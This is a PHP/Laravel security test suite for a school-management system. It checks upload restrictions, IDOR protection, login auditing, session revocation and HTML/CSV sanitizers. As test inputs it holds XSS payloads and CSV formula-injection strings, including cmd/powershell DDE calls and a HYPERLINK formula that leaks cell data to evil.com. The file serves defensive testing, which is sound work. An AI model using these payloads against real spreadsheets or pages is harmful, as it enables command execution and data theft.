<?php

namespace Tests\Feature;

use App\Enums\TemplateCrachaEntidade;
use App\Filament\Pages\Auth\ChangePassword;
use App\Filament\Pages\Auth\CustomLogin;
use App\Filament\Portal\Pages\CentralAtendimento;
use App\Filament\Resources\Users\Pages\CreateUser;
use App\Models\AtendimentoChamado;
use App\Models\AtendimentoMensagem;
use App\Models\AtendimentoSetor;
use App\Models\Matricula;
use App\Models\PeriodoLetivo;
use App\Models\Pessoa;
use App\Models\Questionario;
use App\Models\QuestionarioBloco;
use App\Models\QuestionarioPergunta;
use App\Models\SacolaLeitura;
use App\Models\TemplateCrachaV3;
use App\Models\Turma;
use App\Models\User;
use App\Services\QuestionarioService;
use App\Support\CsvSanitizer;
use App\Support\HtmlSanitizer;
use Illuminate\Auth\Events\PasswordReset;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\URL;
use Livewire\Livewire;
use Spatie\Activitylog\Models\Activity;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;
use Tests\Concerns\ProibeLazyLoading;
use Tests\TestCase;

class SecurityHardeningTest extends TestCase
{
    use ProibeLazyLoading;
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        Role::firstOrCreate(['name' => 'super_admin', 'guard_name' => 'web']);
        Role::firstOrCreate(['name' => 'responsavel', 'guard_name' => 'web']);
    }

    public function test_rota_de_auto_registro_no_admin_esta_desativada(): void
    {
        $response = $this->get('/admin/register');

        $response->assertNotFound();
    }

    public function test_central_atendimento_bloqueia_upload_de_arquivo_executavel_ou_invalido(): void
    {
        Storage::fake('local');

        $aluno = Pessoa::create(['nome' => 'Filho Teste', 'cpf' => '11122233344']);
        $responsavel = Pessoa::create(['nome' => 'Pai Teste', 'cpf' => '55566677788']);

        $user = User::factory()->create(['activated_at' => now()]);
        $user->assignRole('responsavel');
        $user->pessoas()->attach([$aluno->id, $responsavel->id]);

        $periodo = PeriodoLetivo::create(['nome' => '2026', 'data_inicio' => '2026-02-01', 'data_fim' => '2026-12-15']);
        $turma = Turma::create(['nome' => 'Turma Teste', 'periodo_letivo_id' => $periodo->id]);
        $matricula = Matricula::create([
            'pessoa_id' => $aluno->id,
            'turma_id' => $turma->id,
            'situacao' => 'ativa',
        ]);

        $setor = AtendimentoSetor::create(['nome' => 'Secretaria', 'ativo' => true, 'ordem' => 1]);

        $arquivoMalicioso = UploadedFile::fake()->create('malware.exe', 50, 'application/x-msdownload');

        $this->actingAs($user);

        Livewire::test(CentralAtendimento::class)
            ->set('novoSetorId', $setor->id)
            ->set('novoMatriculaId', $matricula->id)
            ->set('novoAssunto', 'Dúvida com documento')
            ->set('novaMensagemInicial', 'Segue o arquivo em anexo')
            ->set('novoAnexo', $arquivoMalicioso)
            ->call('criarChamado')
            ->assertHasErrors(['novoAnexo']);
    }

    public function test_central_atendimento_salva_anexo_valido_no_disco_local(): void
    {
        Storage::fake('local');

        $aluno = Pessoa::create(['nome' => 'Filha Teste', 'cpf' => '22233344455']);
        $user = User::factory()->create(['activated_at' => now()]);
        $user->assignRole('responsavel');
        $user->pessoas()->attach($aluno->id);

        $periodo = PeriodoLetivo::create(['nome' => '2026', 'data_inicio' => '2026-02-01', 'data_fim' => '2026-12-15']);
        $turma = Turma::create(['nome' => 'Turma B', 'periodo_letivo_id' => $periodo->id]);
        $matricula = Matricula::create([
            'pessoa_id' => $aluno->id,
            'turma_id' => $turma->id,
            'situacao' => 'ativa',
        ]);

        $setor = AtendimentoSetor::create(['nome' => 'Financeiro', 'ativo' => true, 'ordem' => 1]);
        $arquivoPdf = UploadedFile::fake()->create('comprovante.pdf', 100, 'application/pdf');

        $this->actingAs($user);

        Livewire::test(CentralAtendimento::class)
            ->set('novoSetorId', $setor->id)
            ->set('novoMatriculaId', $matricula->id)
            ->set('novoAssunto', 'Envio de comprovante de pagamento')
            ->set('novaMensagemInicial', 'Segue o comprovante em anexo para conferência.')
            ->set('novoAnexo', $arquivoPdf)
            ->call('criarChamado')
            ->assertHasNoErrors();

        $mensagem = AtendimentoMensagem::latest('id')->first();
        $this->assertNotNull($mensagem->anexo_path);
        Storage::disk('local')->assertExists($mensagem->anexo_path);
    }

    public function test_central_atendimento_impede_idor_em_chamados_de_outros_usuarios(): void
    {
        // Usuário A e seu Chamado
        $pessoaA = Pessoa::create(['nome' => 'Pessoa A', 'cpf' => '33344455566']);
        $userA = User::factory()->create(['activated_at' => now()]);
        $userA->assignRole('responsavel');
        $userA->pessoas()->attach($pessoaA->id);

        $setor = AtendimentoSetor::create(['nome' => 'Coordenação', 'ativo' => true, 'ordem' => 1]);
        $chamadoA = AtendimentoChamado::create([
            'setor_id' => $setor->id,
            'solicitante_id' => $pessoaA->id,
            'assunto' => 'Chamado Sigiloso do Aluno A',
            'status' => 'aberto',
        ]);

        // Usuário B tenta manipular o chamado A
        $pessoaB = Pessoa::create(['nome' => 'Pessoa B', 'cpf' => '77788899900']);
        $userB = User::factory()->create(['activated_at' => now()]);
        $userB->assignRole('responsavel');
        $userB->pessoas()->attach($pessoaB->id);

        $this->actingAs($userB);

        $component = Livewire::test(CentralAtendimento::class)
            ->set('chamadoSelecionadoId', $chamadoA->id)
            ->set('respostaTexto', 'Tentativa de injeção de mensagem indevida')
            ->call('enviarResposta');

        // A mensagem NÃO deve ser adicionada ao chamado A
        $this->assertDatabaseMissing('atendimento_mensagens', [
            'chamado_id' => $chamadoA->id,
            'mensagem' => 'Tentativa de injeção de mensagem indevida',
        ]);
    }

    public function test_cabecalho_permissions_policy_permite_camera_no_mesmo_dominio(): void
    {
        $response = $this->get('/');

        $response->assertHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=(self)');
        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('X-Frame-Options', 'SAMEORIGIN');
    }

    public function test_login_com_credenciais_incorretas_nao_enumera_usuario_desativado(): void
    {
        // Usuário existe mas está desativado
        User::factory()->create([
            'email' => 'desativado@torre360.com.br',
            'password' => Hash::make('Senha@Forte1234'),
            'activated_at' => null,
            'deactivated_at' => now()->subDay(),
        ]);

        $component = Livewire::test(CustomLogin::class)
            ->fillForm([
                'email' => 'desativado@torre360.com.br',
                'password' => 'SenhaErrada123',
            ])
            ->call('authenticate')
            ->assertHasFormErrors(['email']);

        // A mensagem de erro NÃO deve revelar que a conta está desativada
        $mensagens = collect($component->errors()->all())->implode(' ');
        $this->assertStringNotContainsString('Esta conta está desativada', $mensagens);
        $this->assertFalse(auth()->check());
    }

    public function test_login_com_credenciais_corretas_em_conta_desativada_bloqueia_e_desloga(): void
    {
        User::factory()->create([
            'email' => 'desativado.correto@torre360.com.br',
            'password' => Hash::make('Senha@Forte1234'),
            'activated_at' => null,
            'deactivated_at' => now()->subDay(),
        ]);

        $component = Livewire::test(CustomLogin::class)
            ->fillForm([
                'email' => 'desativado.correto@torre360.com.br',
                'password' => 'Senha@Forte1234',
            ])
            ->call('authenticate')
            ->assertHasFormErrors(['email']);

        // Quando as credenciais são legítimas, a mensagem específica de conta desativada é exibida e o login é desfeito
        $mensagens = collect($component->errors()->all())->implode(' ');
        $this->assertStringContainsString('Esta conta está desativada', $mensagens);
        $this->assertFalse(auth()->check(), 'Usuário não deve permanecer autenticado.');
    }

    public function test_cadastro_de_usuario_exige_politica_de_senha_forte(): void
    {
        $admin = User::factory()->create(['activated_at' => now()]);
        $admin->assignRole('super_admin');
        $this->actingAs($admin);

        // Senha fraca com apenas 8 caracteres numéricos
        Livewire::test(CreateUser::class)
            ->fillForm([
                'name' => 'Novo Usuario Teste',
                'email' => 'novo.usuario@torre360.com.br',
                'password' => '12345678',
                'password_confirmation' => '12345678',
            ])
            ->call('create')
            ->assertHasFormErrors(['password']);
    }

    public function test_tentativa_de_login_com_email_inexistente_gera_log_de_auditoria_sem_vazar_senha(): void
    {
        $emailInexistente = 'hacker.invasor@tentativa-externa.com';
        $senhaTentada = 'SenhaSuperSecreta123!';

        Livewire::test(CustomLogin::class)
            ->fillForm([
                'email' => $emailInexistente,
                'password' => $senhaTentada,
            ])
            ->call('authenticate')
            ->assertHasFormErrors(['email']);

        // Deve existir log de auditoria no canal auth
        $log = Activity::where('log_name', 'auth')
            ->latest('id')
            ->first();

        $this->assertNotNull($log, 'O evento de login falho deve gerar um registro de auditoria.');
        $this->assertStringContainsString('não localizado', $log->description);
        $this->assertStringContainsString($emailInexistente, $log->description);
        $this->assertEquals($emailInexistente, $log->properties['email_tentado'] ?? null);

        // Segurança e LGPD estrita: a senha digitada NUNCA pode ser armazenada nos logs!
        $todasPropriedades = json_encode($log->properties);
        $this->assertStringNotContainsString($senhaTentada, $todasPropriedades, 'A senha tentada jamais deve ser gravada no log de auditoria.');
        $this->assertArrayNotHasKey('password', $log->properties->toArray(), 'A chave password não pode existir no log.');
    }

    public function test_tentativa_de_login_com_senha_errada_em_usuario_existente_gera_log_de_auditoria_vinculado(): void
    {
        $user = User::factory()->create([
            'email' => 'usuario.cadastrado@torre360.com.br',
            'password' => Hash::make('Senha@Correta1234'),
            'activated_at' => now(),
        ]);

        $senhaIncorreta = 'SenhaTotalmenteErrada999!';

        Livewire::test(CustomLogin::class)
            ->fillForm([
                'email' => $user->email,
                'password' => $senhaIncorreta,
            ])
            ->call('authenticate')
            ->assertHasFormErrors(['email']);

        $log = Activity::where('log_name', 'auth')
            ->where('subject_type', User::class)
            ->where('subject_id', $user->id)
            ->latest('id')
            ->first();

        $this->assertNotNull($log, 'Tentativa de login falho para usuário existente deve gerar log vinculado ao modelo User.');
        $this->assertStringContainsString('usuário cadastrado', $log->description);
        $this->assertStringContainsString($user->name, $log->description);
        $this->assertEquals($user->email, $log->properties['email_tentado'] ?? null);

        // Verifica que a senha não foi gravada
        $todasPropriedades = json_encode($log->properties);
        $this->assertStringNotContainsString($senhaIncorreta, $todasPropriedades);
    }

    public function test_confirmacao_de_matricula_online_bloqueia_acesso_sem_autorizacao_ou_assinatura_idor(): void
    {
        $aluno = Pessoa::create(['nome' => 'Aluno Invasao', 'cpf' => '99988877766']);
        $periodo = PeriodoLetivo::create(['nome' => '2026', 'data_inicio' => '2026-02-01', 'data_fim' => '2026-12-15']);
        $turma = Turma::create(['nome' => 'Turma IDOR', 'periodo_letivo_id' => $periodo->id]);
        $matricula = Matricula::create([
            'pessoa_id' => $aluno->id,
            'turma_id' => $turma->id,
            'situacao' => 'ativa',
        ]);

        // Acesso direto sem sessão e sem assinatura digital deve retornar 403 Forbidden
        $response = $this->get(route('matricular.online.sucesso', ['matricula' => $matricula->id]));
        $response->assertForbidden();
    }

    public function test_confirmacao_de_matricula_online_permite_acesso_com_sessao_ou_url_assinada(): void
    {
        $aluno = Pessoa::create(['nome' => 'Aluno Valido', 'cpf' => '88877766655']);
        $periodo = PeriodoLetivo::create(['nome' => '2026', 'data_inicio' => '2026-02-01', 'data_fim' => '2026-12-15']);
        $turma = Turma::create(['nome' => 'Turma Valida', 'periodo_letivo_id' => $periodo->id]);
        $matricula = Matricula::create([
            'pessoa_id' => $aluno->id,
            'turma_id' => $turma->id,
            'situacao' => 'ativa',
        ]);

        // 1. Acesso com ID na sessão legítima do wizard
        $responseSessao = $this->withSession(['matricula_online_id' => $matricula->id])
            ->get(route('matricular.online.sucesso', ['matricula' => $matricula->id]));
        $responseSessao->assertOk();

        // 2. Acesso através de URL assinada temporária gerada pelo sistema
        $signedUrl = URL::temporarySignedRoute(
            'matricular.online.sucesso',
            now()->addDays(7),
            ['matricula' => $matricula->id]
        );

        $responseAssinada = $this->get($signedUrl);
        $responseAssinada->assertOk();
    }

    public function test_impressao_de_etiquetas_e_ficha_de_sacola_bloqueia_usuarios_nao_autorizados(): void
    {
        // 1. Não autenticado em etiquetas -> redireciona login
        $responseEtiquetasAnon = $this->get('/admin/biblioteca/etiquetas/imprimir');
        $responseEtiquetasAnon->assertRedirect(route('filament.admin.auth.login'));

        // 2. Autenticado como responsável comum sem permissão de biblioteca
        $userSemPermissao = User::factory()->create(['activated_at' => now()]);
        $userSemPermissao->assignRole('responsavel');
        $this->actingAs($userSemPermissao);

        $responseEtiquetasAutenticado = $this->get('/admin/biblioteca/etiquetas/imprimir');
        $responseEtiquetasAutenticado->assertForbidden();

        // 3. Ficha de sacola sem autorização
        $responsavel = Pessoa::create(['nome' => 'Responsavel Outro', 'cpf' => '44433322211']);
        $sacola = SacolaLeitura::create([
            'titulo' => 'Sacola Aventuras',
            'responsavel_id' => $responsavel->id,
            'data_retirada' => now(),
            'data_prevista_devolucao' => now()->addDays(7),
        ]);

        $responseFicha = $this->get("/admin/biblioteca/sacolas/{$sacola->id}/ficha");
        $responseFicha->assertForbidden();
    }

    public function test_html_sanitizer_remove_scripts_e_eventos_maliciosos_preservando_formatacao(): void
    {
        $payloadMalicioso = '<p>Texto legítimo <strong>em negrito</strong>.</p>'
            .'<script>alert("XSS 1")</script>'
            .'<img src="foto.jpg" onerror="alert(\'XSS 2\')" />'
            .'<a href="javascript:alert(\'XSS 3\')">Clique aqui</a>'
            .'<iframe src="https://evil.com"></iframe>';

        $sanitizado = HtmlSanitizer::clean($payloadMalicioso);

        $this->assertStringContainsString('Texto legítimo', $sanitizado);
        $this->assertStringContainsString('<strong>em negrito</strong>', $sanitizado);
        $this->assertStringNotContainsString('<script', $sanitizado);
        $this->assertStringNotContainsString('alert("XSS 1")', $sanitizado);
        $this->assertStringNotContainsString('onerror', $sanitizado);
        $this->assertStringNotContainsString('javascript:', $sanitizado);
        $this->assertStringNotContainsString('<iframe', $sanitizado);
    }

    public function test_visualizar_documento_forca_attachment_e_headers_de_seguranca_para_svg(): void
    {
        Storage::fake('local');

        $staffUser = User::factory()->create(['activated_at' => now()]);
        $staffUser->assignRole('super_admin');
        $this->actingAs($staffUser);

        // Cria um arquivo SVG no storage local sob documentos_emitidos
        $svgPath = 'documentos_emitidos/teste_vetor.svg';
        $svgContent = '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><circle r="10"/></svg>';
        Storage::disk('local')->put($svgPath, $svgContent);

        $response = $this->get(route('documentos.visualizar', ['path' => $svgPath]));

        $response->assertOk();
        $disposition = $response->headers->get('Content-Disposition');
        $this->assertStringContainsString('attachment', $disposition, 'Arquivos SVG devem ser forçados para download/attachment.');
        $this->assertEquals('nosniff', $response->headers->get('X-Content-Type-Options'));
        $this->assertStringContainsString("default-src 'none'", $response->headers->get('Content-Security-Policy'));
    }

    public function test_alteracao_de_senha_no_perfil_revoga_outras_sessoes_concorrentes_e_registra_auditoria(): void
    {
        config(['session.driver' => 'database']);

        $senhaOriginal = 'Senha@Antiga1234';
        $novaSenha = 'NovaSenha@SuperForte2026';

        $user = User::factory()->create([
            'email' => 'usuario.trocasenha@torre360.com.br',
            'password' => Hash::make($senhaOriginal),
            'activated_at' => now(),
        ]);
        $user->assignRole('super_admin');

        $outroUser = User::factory()->create([
            'email' => 'outro.usuario@torre360.com.br',
            'activated_at' => now(),
        ]);

        // Simula sessão ativa em outro dispositivo do mesmo usuário
        DB::table('sessions')->insert([
            'id' => 'sessao_concorrente_dispositivo_antigo',
            'user_id' => $user->id,
            'ip_address' => '10.0.0.99',
            'user_agent' => 'Mozilla/5.0 (Compromised Device)',
            'payload' => 'payload_antigo',
            'last_activity' => time(),
        ]);

        // Simula sessão ativa de um usuário inocente que NÃO deve ser afetada
        DB::table('sessions')->insert([
            'id' => 'sessao_outro_usuario_legitimo',
            'user_id' => $outroUser->id,
            'ip_address' => '10.0.0.88',
            'user_agent' => 'Mozilla/5.0 (Other User Device)',
            'payload' => 'payload_outro',
            'last_activity' => time(),
        ]);

        $this->actingAs($user);

        Livewire::test(ChangePassword::class)
            ->fillForm([
                'name' => $user->name,
                'email' => $user->email,
                'password' => $novaSenha,
                'passwordConfirmation' => $novaSenha,
                'currentPassword' => $senhaOriginal,
            ])
            ->call('save')
            ->assertHasNoFormErrors();

        // 1. Senha do usuário deve estar devidamente atualizada no banco
        $this->assertTrue(Hash::check($novaSenha, $user->fresh()->password));

        // 2. A sessão concorrente do usuário deve ter sido eliminada fisicamente
        $this->assertFalse(
            DB::table('sessions')->where('id', 'sessao_concorrente_dispositivo_antigo')->exists(),
            'Sessões concorrentes anteriores do usuário devem ser revogadas após a troca de senha.'
        );

        // 3. A sessão do outro usuário não pode ter sido tocada
        $this->assertTrue(
            DB::table('sessions')->where('id', 'sessao_outro_usuario_legitimo')->exists(),
            'Sessões de outros usuários devem permanecer intocadas.'
        );

        // 4. Deve existir registro de auditoria no canal auth documentando a revogação de outras sessões
        $log = Activity::where('log_name', 'auth')
            ->where('subject_type', User::class)
            ->where('subject_id', $user->id)
            ->latest('id')
            ->first();

        $this->assertNotNull($log, 'A alteração de senha deve gerar log de auditoria no canal auth.');
        $this->assertStringContainsString('alterou sua senha', $log->description);
        $this->assertStringContainsString('revogadas', $log->description);
    }

    public function test_redefinicao_de_senha_esquecida_dispara_revogacao_de_sessoes_no_listener(): void
    {
        config(['session.driver' => 'database']);

        $user = User::factory()->create([
            'email' => 'reset.usuario@torre360.com.br',
            'password' => Hash::make('Senha@Velha999'),
            'activated_at' => now(),
        ]);

        $outroUser = User::factory()->create([
            'email' => 'outro.reset@torre360.com.br',
            'activated_at' => now(),
        ]);

        DB::table('sessions')->insert([
            'id' => 'sessao_esquecida_comprometida',
            'user_id' => $user->id,
            'ip_address' => '10.0.0.77',
            'user_agent' => 'Mozilla/5.0 (Stolen Cookie Device)',
            'payload' => 'payload_comprometido',
            'last_activity' => time(),
        ]);

        DB::table('sessions')->insert([
            'id' => 'sessao_outro_permanece',
            'user_id' => $outroUser->id,
            'ip_address' => '10.0.0.66',
            'user_agent' => 'Mozilla/5.0 (Legit Device)',
            'payload' => 'payload_legit',
            'last_activity' => time(),
        ]);

        // Simula disparo do evento oficial de PasswordReset
        event(new PasswordReset($user));

        // 1. Sessão do usuário resetado deve ser removida
        $this->assertFalse(
            DB::table('sessions')->where('id', 'sessao_esquecida_comprometida')->exists(),
            'Sessões ativas devem ser canceladas após o reset de senha esquecida.'
        );

        // 2. Sessão do outro usuário deve ser mantida
        $this->assertTrue(
            DB::table('sessions')->where('id', 'sessao_outro_permanece')->exists()
        );

        // 3. Log de auditoria gerado
        $log = Activity::where('log_name', 'auth')
            ->where('subject_type', User::class)
            ->where('subject_id', $user->id)
            ->latest('id')
            ->first();

        $this->assertNotNull($log);
        $this->assertStringContainsString('redefinida com sucesso', $log->description);
        $this->assertStringContainsString('revogadas', $log->description);
    }

    public function test_csv_sanitizer_neutraliza_formulas_maliciosas_e_comandos_dde(): void
    {
        // 1. Payloads maliciosos de injeção de fórmulas e comandos DDE
        $payloadsMaliciosos = [
            '=cmd|\'/C calc\'!A0',
            '@SUM(1+1)*cmd|\'/C certutil\'!A0',
            '-2+3+cmd|\'/C powershell\'!A0',
            '+HYPERLINK("http://evil.com/leak?d="&A1; "Clique")',
            "\t=1+1",
            "\r=1+1",
            '|cmd.exe',
            '%COMSPEC%',
            '   =1+1',
        ];

        foreach ($payloadsMaliciosos as $payload) {
            $sanitizado = CsvSanitizer::sanitize($payload);
            $this->assertStringStartsWith("'", (string) $sanitizado, "O payload '{$payload}' deveria ter sido neutralizado com apóstrofo.");
        }

        // 2. Dados numéricos e textos legítimos NÃO devem ser corrompidos
        $dadosLegitimos = [
            -10,
            100,
            '-15.50',
            '+5511999999999',
            'Maria da Silva Santos',
            'teste.aluno@torre360.com.br',
            'Rua das Flores, 123',
            '01/01/2026',
            null,
            true,
        ];

        foreach ($dadosLegitimos as $dado) {
            $resultado = CsvSanitizer::sanitize($dado);
            if (is_numeric($dado)) {
                $this->assertEquals($dado, $resultado, 'Valores puramente numéricos legítimos devem ser preservados.');
            } elseif (is_string($dado)) {
                $this->assertStringStartsNotWith("'", $resultado, "Texto comum legítimo '{$dado}' não deve receber apóstrofo.");
            }
        }

        // 3. Desanitize reverte com precisão apóstrofos de segurança
        $this->assertEquals('=cmd|calc', CsvSanitizer::desanitize("'=cmd|calc"));
        $this->assertEquals('Texto Normal', CsvSanitizer::desanitize('Texto Normal'));
    }

    public function test_exportacao_csv_de_questionario_neutraliza_formulas_em_campos_de_usuario(): void
    {
        $questionario = Questionario::create([
            'titulo' => 'Questionário de Avaliação',
            'slug' => 'questionario-avaliacao-teste',
            'ativo' => true,
        ]);

        $bloco = QuestionarioBloco::create([
            'questionario_id' => $questionario->id,
            'identificador' => 'bloco_1',
            'titulo' => '=cmd|\'/C calc\'!A0', // Título malicioso
            'ordem' => 1,
        ]);

        QuestionarioPergunta::create([
            'questionario_bloco_id' => $bloco->id,
            'identificador' => 'pergunta_1',
            'enunciado' => '+HYPERLINK("http://evil.com")', // Enunciado com payload de exfiltração
            'tipo' => 'texto',
            'ordem' => 1,
        ]);

        $service = app(QuestionarioService::class);
        $csvGerado = $service->exportToCsv($questionario);

        // O CSV deve conter os apóstrofos de escape neutralizando as fórmulas
        $this->assertStringContainsString("'=cmd|", $csvGerado);
        $this->assertStringContainsString("'+HYPERLINK", $csvGerado);
        $this->assertStringNotContainsString('";=cmd|', $csvGerado);
        $this->assertStringNotContainsString('";+HYPERLINK', $csvGerado);
        $this->assertStringNotContainsString('"=cmd|', $csvGerado);
        $this->assertStringNotContainsString('"+HYPERLINK', $csvGerado);
    }

    public function test_editor_de_cracha_v3_bloqueia_usuario_staff_sem_permissao_do_shield(): void
    {
        $professorRole = Role::firstOrCreate(['name' => 'professor', 'guard_name' => 'web']);
        $professor = User::factory()->create([
            'activated_at' => now()->subDay(),
            'deactivated_at' => null,
        ]);
        $professor->assignRole($professorRole);

        // Usuário é staff, mas NÃO tem permissão de TemplateCrachaV3
        $this->assertTrue($professor->isStaff());

        $template = TemplateCrachaV3::create([
            'nome' => 'Crachá de Alunos 2026',
            'tipo_entidade' => TemplateCrachaEntidade::PESSOA,
            'largura' => 85,
            'altura' => 54,
            'dados_json' => ['elementos' => []],
        ]);

        // Acesso ao editor sem permissão do Shield deve retornar 403
        $responseEditor = $this->actingAs($professor)->get(route('template-crachas-v3.editor', $template));
        $responseEditor->assertForbidden();

        // Tentativa de salvar layout sem permissão deve retornar 403
        $responseSave = $this->actingAs($professor)->postJson(route('template-crachas-v3.save', $template), [
            'dados_json' => ['elementos' => [['id' => 1]]],
        ]);
        $responseSave->assertForbidden();

        // Conceder a permissão do Shield
        $permission = Permission::firstOrCreate(['name' => 'Update:TemplateCrachaV3', 'guard_name' => 'web']);
        $professor->givePermissionTo($permission);

        // Agora com a permissão, pode salvar com sucesso
        $responseSaveSuccess = $this->actingAs($professor)->postJson(route('template-crachas-v3.save', $template), [
            'dados_json' => ['elementos' => [['id' => 1]]],
        ]);
        $responseSaveSuccess->assertOk();
        $responseSaveSuccess->assertJson(['success' => true]);

        $this->assertEquals(['elementos' => [['id' => 1]]], $template->fresh()->dados_json);
    }
}
